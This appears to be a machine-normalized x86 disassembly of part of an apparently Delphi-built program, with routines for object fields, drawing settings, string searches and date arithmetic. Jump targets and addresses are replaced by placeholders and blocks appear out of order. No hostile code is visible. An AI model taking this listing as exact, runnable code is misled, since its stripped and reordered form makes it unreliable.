mov eax ebx
call sub_440b8c
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_461614
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
call sub_404398
xor eax eax
push ebp
push sub_461740
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
mov dl [ rw-data ]
call sub_4040d0
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4044ec
mov ebx eax
test ebx ebx
jne r-xdata
xor esi esi
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov esi eax
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_404408
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx eax
mov eax esi
call sub_460cd0
mov esi eax
mov eax [ ebp - 0xc ]
inc [ eax ]
lea eax [ ebp - 0x8 ]
mov ecx ebx
mov edx 0x1
call sub_404448
lea eax [ ebp - 0x18 ]
mov dl [ rw-data ]
call sub_4040d0
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_4044ec
mov ebx eax
test ebx ebx
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461747
lea eax [ ebp - 0x18 ]
mov edx 0x3
call sub_403f0c
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx eax
mov eax esi
call sub_460cd0
mov esi eax
mov eax [ ebp - 0xc ]
inc [ eax ]
sub_461750
add eax 0x258
sub edx 0x1
jb r-xdata
mov eax [ eax ]
retn
je r-xdata
mov eax [ eax + 0x4 ]
retn
dec edx
je r-xdata
mov eax [ eax + 0x8 ]
retn
jmp r-xdata
mov eax [ eax + 0xc ]
retn
sub_461770
push esi
lea esi [ eax + 0x258 ]
sub edx 0x1
jb r-xdata
mov edx esi
call sub_461564
pop esi
retn
je r-xdata
lea edx [ esi + 0x4 ]
call sub_461564
pop esi
retn
dec edx
je r-xdata
lea edx [ esi + 0x8 ]
call sub_461564
pop esi
retn
jmp r-xdata
lea edx [ esi + 0xc ]
call sub_461564
pop esi
retn
sub_4617c4
push esi
lea edx [ eax + 0x28e ]
mov ecx [ eax + 0x22d ]
cmp ecx [ edx ]
jle r-xdata
mov ecx [ eax + 0x231 ]
cmp ecx [ edx + 0x4 ]
jle r-xdata
mov [ edx ] ecx
mov ecx [ edx ]
mov esi [ edx + 0x8 ]
cmp ecx esi
jle r-xdata
mov [ edx + 0x4 ] ecx
cmp ecx esi
jne r-xdata
inc ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
mov ecx [ edx + 0x4 ]
mov esi [ edx + 0xc ]
cmp ecx esi
jle r-xdata
add ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
cmp ecx esi
jne r-xdata
inc ecx
mov [ edx + 0xc ] ecx
jmp r-xdata
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x240 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x244 ] ecx
mov ecx [ edx ]
add ecx [ edx + 0x8 ]
sar ecx 0x1
jns r-xdata
add ecx [ eax + 0x4c ]
mov [ edx + 0xc ] ecx
mov [ eax + 0x248 ] ecx
mov ecx [ edx + 0x4 ]
add ecx [ edx + 0xc ]
sar ecx 0x1
jns r-xdata
adc ecx 0x0
mov [ eax + 0x24c ] ecx
pop esi
retn
adc ecx 0x0
sub_461858
push ebx
push esi
push edi
mov esi eax
mov edi [ esi + 0x288 ]
mov ebx [ edi + 0xc ]
mov eax [ esi + 0x70 ]
call sub_41c964
mov edx eax
mov eax ebx
call sub_41d310
mov eax ebx
call sub_41d308
cmp eax 0xffffff
jne r-xdata
mov dl 0xf
mov eax ebx
call sub_41d3f0
xor edx edx
mov eax ebx
call sub_41d40c
mov edx 0x1
mov eax ebx
call sub_41d43c
mov eax [ edi + 0x10 ]
mov dl 0x1
call sub_41d734
mov eax [ esi + 0x284 ]
mov edx [ eax + 0x10 ]
push edx
mov edx [ eax + 0x14 ]
push edx
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x8 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x50 ]
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_41d310
sub_461904
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414654
mov edi esi
mov eax edi
call sub_4617ac
mov edx eax
mov eax ebx
call sub_4617b8
mov al [ edi + 0x271 ]
mov [ ebx + 0x271 ] al
mov eax [ edi + 0x274 ]
mov [ ebx + 0x274 ] eax
push esi
push edi
lea esi [ edi + 0x258 ]
lea edi [ ebx + 0x258 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax edi
call sub_4618ec
mov edx eax
mov eax ebx
call sub_4618f8
mov al [ edi + 0x278 ]
mov [ ebx + 0x278 ] al
mov edx [ edi + 0x27c ]
mov eax [ ebx + 0x27c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ edi + 0x228 ]
mov [ ebx + 0x228 ] eax
mov edx [ edi + 0x70 ]
mov eax ebx
call sub_43a710
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4619b0
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x270 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_41d404
test al al
je r-xdata
mov eax ebx
call sub_41d434
dec eax
jne r-xdata
xor edx edx
mov eax ebx
call sub_41d43c
sub_4619e0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
cmp [ ebx + 0x270 ] 0x0
je r-xdata
mov eax [ ebx + 0x288 ]
mov esi [ eax + 0xc ]
xor edx edx
mov eax esi
call sub_41d40c
mov edx 0x1
mov eax esi
call sub_41d43c
mov dl 0x4
mov eax esi
call sub_41d3f0
mov eax [ ebx + 0x288 ]
mov eax [ eax + 0x10 ]
mov dl 0x1
call sub_41d734
mov al [ ebx + 0x212 ]
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebx + 0x70 ]
push eax
mov edx [ ebx + 0x218 ]
push edx
lea edx [ esp + 0x8 ]
mov ecx [ ebx + 0x288 ]
mov ecx [ ecx + 0x4 ]
xchg ecx eax
call sub_42a028
mov al [ ebx + 0x211 ]
test al al
je r-xdata
cmp al 0x2
sete dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
push edx
mov edx [ ebx + 0x214 ]
push edx
cmp al 0x1
sete al
and eax 0x7f
mov ecx [ eax * 4 + rw-data ]
lea edx [ esp + 0x8 ]
mov eax [ ebx + 0x288 ]
mov eax [ eax + 0x4 ]
call sub_42a028
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp al 0x2
sete dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
push edx
mov edx [ ebx + 0x214 ]
push edx
cmp al 0x1
sete al
and eax 0x7f
mov ecx [ eax * 4 + rw-data ]
lea edx [ esp + 0x8 ]
mov eax [ ebx + 0x288 ]
mov eax [ eax + 0x4 ]
call sub_42a028
sub_461b34
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_460fac
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_462098
mov [ ebx + 0x2c0 ] eax
mov [ ebx + 0x2bc ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fd94
mov esi eax
mov [ ebx + 0x2b8 ] esi
mov [ esi + 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0xd0 ]
mov [ esi + 0x10 ] eax
mov [ ebx + 0x2b0 ] 0x8
mov [ ebx + 0x2b5 ] 0x1
mov [ ebx + 0x2b6 ] 0x3
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_461bc8
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0x2c0 ]
call sub_403198
mov eax [ esi + 0x2b8 ]
call sub_403198
mov edx ebx
and dl 0xfc
mov eax esi
call sub_461134
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_461c04
push ebx
mov ebx eax
cmp [ ebx + 0x2da ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebx + 0x2c4 ] 0x0
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
sub_461c3c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_461904
pop edi
pop esi
pop ebx
retn
mov edi esi
mov edx [ edi + 0x2b8 ]
mov eax [ ebx + 0x2b8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov al [ edi + 0x2bc ]
mov [ ebx + 0x2bc ] al
mov edx [ edi + 0x2c0 ]
mov eax [ ebx + 0x2c0 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov al [ edi + 0x2b6 ]
mov [ ebx + 0x2b6 ] al
mov al [ edi + 0x2b5 ]
mov [ ebx + 0x2b5 ] al
mov al [ edi + 0x2b4 ]
mov [ ebx + 0x2b4 ] al
mov eax [ edi + 0x2b0 ]
mov [ ebx + 0x2b0 ] eax
sub_461cc4
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov esi [ ebx + 0x2b8 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0xc ]
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov eax [ esi + 0xc ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov edi eax
sub_461d00
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2b8 ]
call sub_4203ac
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2b8 ]
call sub_4203c4
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor esi esi
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
jge r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
jge r-xdata
add esi [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2b8 ]
mov eax [ eax + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x18 ]
add ecx esi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
add edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x288 ]
mov edi [ eax ]
call [ edi + 0x34 ]
add ebx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
jl r-xdata
sub_461da0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx [ ebp + 0x8 ]
add ebx 0xffffffe4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x288 ]
mov esi [ eax ]
call [ esi + 0xa4 ]
mov eax [ ebp - 0x8 ]
mov [ ebx ] eax
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ ebx + 0xc ]
mov edx [ ebx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x288 ]
mov esi [ eax ]
call [ esi + 0xa4 ]
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x278 ] 0x0
jne r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc [ ebx + 0x4 ]
sub_461e28
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b8 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x278 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2bc ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x27c ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4613ec
mov ebx eax
test bl bl
je r-xdata
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b8 ]
mov ecx [ eax + 0xc ]
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov ebx [ eax ]
call [ ebx + 0x58 ]
jmp r-xdata
push ebp
call sub_461da0
pop ecx
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x1c ]
call sub_45c428
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2bc ] 0x1
jne r-xdata
push ebp
call sub_461da0
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
push eax
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
xor ecx ecx
mov esi [ eax ]
call [ esi + 0xc0 ]
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xe8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b8 ]
mov eax [ eax + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b8 ]
call sub_4203c4
mov edx [ ebp - 0x8 ]
sub edx eax
sar edx 0x1
jns r-xdata
push ebp
call sub_461d00
pop ecx
jmp r-xdata
add edx [ ebp - 0x18 ]
push edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b8 ]
call sub_4203ac
mov edx [ ebp - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
test bl bl
je r-xdata
add edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
pop ecx
mov esi [ eax ]
call [ esi + 0x34 ]
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov edx [ eax ]
call [ edx + 0x90 ]
sub_461fc0
push esi
push edi
add esp 0xfffffff0
mov esi eax
push esi
mov esi edx
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
mov edx esp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xe4 ]
mov eax [ esi + 0x288 ]
mov edx [ eax ]
call [ edx + 0x98 ]
test al al
jne r-xdata
add esp 0x10
pop edi
pop esi
retn
mov edx esp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd8 ]
sub_462010
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov esi [ edi + 0x2c0 ]
cmp [ esi + 0x14 ] 0x0
je r-xdata
cmp [ edi + 0x270 ] 0x0
je r-xdata
mov al [ esi + 0x4 ]
test al al
je r-xdata
mov ebx [ edi + 0x288 ]
mov eax [ ebx + 0x10 ]
mov edx [ edi + 0x70 ]
call sub_41d618
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_41d734
mov edx ebp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x78 ]
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ esi + 0x8 ]
push edx
push eax
mov edx ebp
mov ecx [ esi + 0x10 ]
mov eax [ edi + 0x288 ]
mov ebx [ eax ]
call [ ebx + 0x7c ]
jmp r-xdata
cmp al 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x10 ]
push edx
push eax
mov edx ebp
mov ecx [ esi + 0x8 ]
mov eax [ edi + 0x288 ]
mov ebx [ eax ]
call [ ebx + 0x7c ]
jmp r-xdata
sub_462098
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403168
mov [ edi + 0xc ] esi
mov [ edi + 0x4 ] 0x0
mov [ edi + 0x10 ] 0xffffff
mov [ edi + 0x8 ] 0xffff
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_4620e8
push esi
push edi
mov esi eax
cmp dl [ esi + 0x14 ]
je r-xdata
pop edi
pop esi
retn
mov [ esi + 0x14 ] dl
mov edi [ esi + 0xc ]
test edi edi
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_462108
push esi
push edi
mov esi eax
cmp dl [ esi + 0x4 ]
je r-xdata
pop edi
pop esi
retn
mov [ esi + 0x4 ] dl
mov edi [ esi + 0xc ]
test edi edi
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_462128
push esi
push edi
mov esi eax
cmp edx [ esi + 0x10 ]
je r-xdata
pop edi
pop esi
retn
mov [ esi + 0x10 ] edx
mov edi [ esi + 0xc ]
test edi edi
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_462148
push esi
push edi
mov esi eax
cmp edx [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
retn
mov [ esi + 0x8 ] edx
mov edi [ esi + 0xc ]
test edi edi
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_462168
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414654
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x14 ]
mov [ ebx + 0x14 ] dl
mov dl [ eax + 0x4 ]
mov [ ebx + 0x4 ] dl
mov edx [ eax + 0x10 ]
mov [ ebx + 0x10 ] edx
mov eax [ eax + 0x8 ]
mov [ ebx + 0x8 ] eax
pop esi
pop ebx
retn
sub_4621a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_403168
mov esi edi
mov [ ebx + 0x4 ] esi
push esi
mov eax [ esi ]
mov eax [ eax + 0xd0 ]
push eax
call sub_460e8c
mov [ ebx + 0x8 ] eax
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_462214
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
call sub_403198
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414628
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_462244
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414654
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub_462298
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0x10 ]
jle r-xdata
mov eax [ ebx + 0xc ]
cmp eax [ ebx + 0x14 ]
jle r-xdata
lea edx [ ebx + 0x10 ]
lea eax [ ebx + 0x8 ]
call sub_460cd8
pop ebx
retn
lea edx [ ebx + 0x14 ]
lea eax [ ebx + 0xc ]
call sub_460cd8
sub_462314
push ebx
push esi
push edi
mov edi edx
mov esi eax
test ebx ebx
jne r-xdata
mov eax esi
call j_sub_4043b4
mov dl [ rw-data ]
mov [ eax + ebx - 0x1 ] dl
mov edx [ esi ]
mov eax edi
call sub_40c6a4
mov ebx eax
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
sub_462344
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404398
xor eax eax
push ebp
push sub_4623d6
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
lea eax [ ebp - 0x8 ]
mov dl [ rw-data ]
call sub_4040d0
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_40c6a4
test eax eax
jle r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
inc ebx
lea edx [ ebp - 0x4 ]
mov ecx eax
mov eax 0x1
xchg edx eax
call sub_404448
lea eax [ ebp - 0xc ]
mov dl [ rw-data ]
call sub_4040d0
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_40c6a4
test eax eax
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4623dd
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403f0c
retn
inc ebx
sub_4623e4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx eax
mov cx 0x1
mov dx 0x1
mov ax 0x76c
call sub_409b1c
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jb r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea ecx [ ebp - 0xe ]
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0xa ]
call sub_409c98
sub bl 0x12
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0xe ] 0xf
jb r-xdata
dec ebx
sub bl 0x5
jb r-xdata
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebp - 0xe ] 0x1
jmp r-xdata
mov [ ebp - 0xe ] 0xf
jmp r-xdata
mov [ ebp - 0xe ] 0x1
jmp r-xdata
je r-xdata
mov cx [ ebp - 0xe ]
mov dx [ ebp - 0xc ]
mov ax [ ebp - 0xa ]
call sub_409b1c
fstp [ ebp - 0x8 ]
fwait
mov [ ebp - 0xe ] 0x1
mov [ ebp - 0xc ] 0x1
jmp r-xdata
sub_462484
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ edx - 0x2 ] 0x1
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x4 ]
jae r-xdata
mov edx [ ebp + 0x8 ]
dec [ edx - 0x6 ]
mov edx [ ebp + 0x8 ]
sub ax [ edx - 0x4 ]
mov dx 0xc
sub dx ax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x4 ] dx
pop ebp
retn
mov edx [ ebp + 0x8 ]
sub [ edx - 0x4 ] ax
pop ebp
retn
sub_4624c0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ edx - 0x2 ] 0x1
mov edx [ ebp + 0x8 ]
add [ edx - 0x4 ] ax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0xc
jbe r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
inc [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
sub [ eax - 0x4 ] 0xc
sub_4624f0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
cmp [ edx - 0x7 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_462484
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_4624c0
pop ecx
pop ebp
retn
sub_462514
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx ecx
mov [ ebp - 0x7 ] dl
test al al
je r-xdata
cmp [ ebp - 0x7 ] 0x0
je r-xdata
push [ ebx + 0x4 ]
push [ ebx ]
lea ecx [ ebp - 0x2 ]
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x6 ]
call sub_409c98
xor eax eax
mov al [ ebp + 0x8 ]
add eax 0xffffffee
cmp eax 0x6
ja r-xdata
fld [ ebx ]
fsub [ ebp + 0xc ]
fstp [ ebx ]
fwait
fld [ ebx ]
fadd [ ebp + 0xc ]
fstp [ ebx ]
fwait
jmp r-xdata
cmp [ ebp - 0x7 ] 0x0
je r-xdata
jmp [ eax * 4 + jump_table_462553 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
fld [ ebx ]
fsub [ ebp + 0xc ]
fstp [ ebx ]
fwait
jmp r-xdata
fld [ ebx ]
fadd [ ebp + 0xc ]
fstp [ ebx ]
fwait
jmp r-xdata
cmp [ ebp - 0x2 ] 0xf
jbe r-xdata
push ebp
mov ax 0x1
call sub_4624f0
pop ecx
jmp r-xdata
push ebp
mov ax 0x2
call sub_4624f0
pop ecx
jmp r-xdata
push ebp
mov ax 0x3
call sub_4624f0
pop ecx
jmp r-xdata
push ebp
mov ax 0x4
call sub_4624f0
pop ecx
jmp r-xdata
push ebp
mov ax 0x6
call sub_4624f0
pop ecx
jmp r-xdata
cmp [ ebp - 0x7 ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x1
jbe r-xdata
mov [ ebp - 0x2 ] 0xf
jmp r-xdata
mov cx [ ebp - 0x2 ]
mov dx [ ebp - 0x4 ]
mov ax [ ebp - 0x6 ]
call sub_409b1c
fstp [ ebx ]
fwait
jmp r-xdata
dec [ ebp - 0x6 ]
jmp r-xdata
inc [ ebp - 0x6 ]
jmp r-xdata
push ebp
mov ax 0x1
call sub_4624f0
pop ecx
mov [ ebp - 0x2 ] 0xf
jmp r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
sub_462648
push ebp
mov ebp esp
add esp 0xfffffff8
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jae r-xdata
fld [ r-xdata ]
fmul [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_462648
fmul [ r-xdata ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_462648
fld [ r-xdata ]
fmulp st1
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
fld [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn 0x8
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jae r-xdata
xor eax eax
